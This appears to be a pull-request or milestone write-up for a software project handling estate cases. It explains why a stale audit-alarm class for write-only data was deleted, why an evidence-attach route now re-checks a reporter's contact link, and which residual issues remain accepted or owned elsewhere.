**M48's last PR, and its two loose ends were the same shape: a control that was
right when written and falsified by a later milestone, with nothing watching for
the falsification.** One was a detection bound, one an authorization check.
Neither was found by a test going red, because in both cases the mechanism that
would have noticed is the one that had been made wrong.

### The alarm that fired on the reviewed path

`ENCRYPT_ONLY_PREFIXES` held exactly one member for its whole life —
`distributions`, on the ground that settlement amounts are write-only and no
read route exists. It was introduced by M18 PR2 (`eef5606`, 2026-08-13) and
never edited again, and the claim was TRUE when written: its own note credits
M18 PR1 with having corrected an earlier comment that asserted a read route
which did not then exist. Then M23 PR4b (`4e125e1`, 2026-08-21) shipped
`distributionAmount`, and from that day every dual-control amount check an
operator performed breached the loudest class in the table at count 1.

That is the `asset`/`sentinel` defect wearing a different token — that row went
loud as `unmodeled_principal` for want of a row, this one as `encrypt_only` for
an absolute claim that had gone stale — and the table already carries its
lesson: a reviewed path raising the alarm reserved for unreviewed ones is how an
alarm stops being read. The bound sat above the principal test — `boundFor`
returned the encrypt-only zero before it ever looked at who was reading — so
M48 PR2's work deriving `actorType` could not clear it either.

**The class is DELETED, not emptied.** An empty map leaves a branch `boundFor`
cannot take, a `BoundName` member nothing can produce, and a fence that loops
zero times: all green, all meaningless, and the shape this repo names most
often. Deleting it also strengthens `undecidedPrefixes`, which now demands a
BOUND ROW for every registered prefix rather than accepting a prose sentence as
a decision. The cost is stated in the source: a genuinely unreadable prefix no
longer gets a distinct alarm name and would resolve to `unmodeled_principal`.
That is the right trade while the class has zero correct instances.

**Two rows replace it, one per principal class, because both reach the site.**
Modelling one and not the other would leave the unmodelled half breaching at
count 1 on a reviewed path — the defect again, one layer down. The operator's
ceiling is the TIGHTER of the two, and the asymmetry is about reach rather than
the act: an executor is confined to estates they administer, while an operator
can open any verified case, so the same count means something different. The
spec asserts that inequality rather than the two numbers, which would only
restate the table.

**The membership is DERIVED, across a package boundary.** The audit spec reads
`admin.service.ts` for the literal `actorType: isOperator ? 'operator' : 'user'`
and requires a named bound for both arms, so reverting M48 PR2's derivation
reddens a bound test in another service. That read is declared in
`apps/services/audit/turbo.json` — without it the gate would replay a cached
pass while its only real input changed, and the repo's own fence for that named
the omission before this paragraph was written.

### The write the link check had not reached

M48 PR1 made the five reads behind `assertCaseVisible` re-derive the reporter's
contact link at read time, and demonstrated in a browser that the same unlinked
session could still append to a dead person's evidence trail. PR1 recorded that
rather than folding it in.

**The category is now derived rather than asserted.** Six routes authorize
through `caseResource`'s frozen `reported_by`; the Cedar policy grants a reporter
exactly `read` and `evidence_add`; so a reporter reaches two of the six, and only
one of those writes. `attachCaseEvidence` was the last member of the category the
intake rule had not been applied to — `report` itself refuses unless
`isLinkedContact` holds now, and the reads were fixed in PR1.

**`getCase` stays open, deliberately.** It is §6g's evidence argument: the
reporter must not lose sight of the report they filed. Closing it would remove no
information — `listForUser` matches the same frozen column and returns the same
row — while pushing the read onto a route that deliberately emits nothing.

**The refusal is NOT the uniform 404.** The uniform answer exists so that an id
cannot confirm a row exists, and nothing is hidden here: the reporter still sees
this case in their own list. A 404 on the attach would be a control firing while
wearing the face of an outage, which is the one substitution this repo forbids
outright. A stranger never reaches the check; Cedar denies above it.

### Residuals

- **[ACCEPTED]** *Both `distributions` bounds are reviewed guesses rather than
  measured ceilings.* Most measured rows carry a peak from M18 PR1's journey,
  though not all — `asset_event`/`user` was zero at M18 PR2 (`eef5606`) and
  moved to 3 in M19 PR2 (`9e6ab24`), so a later milestone measuring a row it
  reached first is precedent rather than novelty. This prefix had no read route
  when either journey ran. PR3 adds the drive, so `measuredPerMinute` is now 1
  on both rows rather than 0 —
  and 1 is a FLOOR, not a ceiling: the drive reveals one amount once to prove the
  path is reached and recorded under the right `actor_type`, which is a different
  claim from sampling what an executor settling an estate actually costs. Both
  notes say which of the two the number is, because a small measured figure read
  as a workload is how a bound gets set an order of magnitude too tight. The
  numbers move when there is real traffic to size them against.
- **[ACCEPTED]** *A genuinely write-only prefix now has no distinct alarm name.*
  Deleting the encrypt-only class means the next such column resolves to
  `unmodeled_principal` rather than to a token naming its own reason. This is the
  stated cost of preferring an absence to a filter, and the mitigation is that
  `undecidedPrefixes` is now stricter than the thing it replaced: the claim
  belongs in a row's note, beside a number, where a reviewer meets it.
- **[OWNER: E1]** *§6q's provisional list of zero-measured bounds is a
  hand-maintained list beside a table that grows.* It names six prefixes —
  `family`, `asset_event`, `plaid_item`, `account`, `assistant_tool_call`,
  `users`. Deriving the same set from the table at `360e95e` gives EIGHT rows
  across eight distinct prefixes: the two it omits are `asset` (sentinel) and
  `doc` (operator). Both omissions predate this branch, and PR3 adds nothing to
  that set — its two new rows carry `measuredPerMinute: 1`, so the table grows
  from sixteen rows to eighteen while the zero-measured set stays at eight. The
  bullet's other half is half-true rather than false: it says those bounds are
  "marked as such in the table", and three of the eight notes do say
  *provisional* — `family`, `account`, `assistant_tool_call`. Recorded rather
  than folded in — it is E1-owned, and a
  milestone that fixes another's residual in passing is how ownership stops
  meaning anything. The durable fix is to derive the list rather than restate
  it, which is M43's subject.
